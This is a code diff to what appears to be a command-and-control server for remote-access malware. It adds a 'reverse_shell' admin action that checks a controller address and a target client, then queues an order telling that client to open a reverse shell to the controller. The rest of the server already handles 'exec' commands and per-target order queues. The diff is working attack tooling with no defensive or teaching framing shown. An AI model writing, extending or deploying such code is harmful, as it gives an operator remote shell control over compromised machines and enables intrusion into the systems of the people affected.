@@ -192,6 +192,16 @@ class Server:
                 elif t == "LOG":
                     log.info(f"[{client_id}] {header.get('message')}")
 
+                elif t == "REVERSE_SHELL":
+                    controller_addr = header.get("controller_addr")
+                    if not controller_addr:
+                        response = {"type": "ERROR", "message": "Controller address missing"}
+                        await write_frame(writer, response, b"")
+                        continue
+
+                    response = {"type": "REVERSE_SHELL", "controller_addr": controller_addr}
+                    await write_frame(writer, response, b"")
+
                 else:
                     log.debug(f"[{client_id}] Unhandled message type: {t}")
         except (ProtocolError, asyncio.IncompleteReadError) as e:
@@ -249,6 +259,7 @@ class Server:
             "exec",
             "session_info",
             "health_status",
+            "reverse_shell",
         }:
             await write_frame(
                 writer, {"type": "ERROR", "error": "unknown_admin_action"}
@@ -435,6 +446,23 @@ class Server:
                 self.pending.pop(req_id, None)
             writer.close()
             await writer.wait_closed()
+            return
+
+        if action == "reverse_shell":
+            controller_addr = header.get("controller_addr")
+            if not controller_addr:
+                await write_frame(writer, {"type": "ERROR", "error": "missing_controller_addr"})
+                writer.close(); await writer.wait_closed()
+                return
+            if not target or target not in self.clients:
+                await write_frame(writer, {"type": "ERROR", "error": "unknown_target"})
+                writer.close(); await writer.wait_closed()
+                return
+            session = self.clients[target]
+            order = {"header": {"type": "REVERSE_SHELL", "controller_addr": controller_addr}}
+            await session.queue.put(order)
+            await write_frame(writer, {"type": "QUEUED", "order": "reverse_shell", "controller_addr": controller_addr})
+            writer.close(); await writer.wait_closed()
             return
 
 
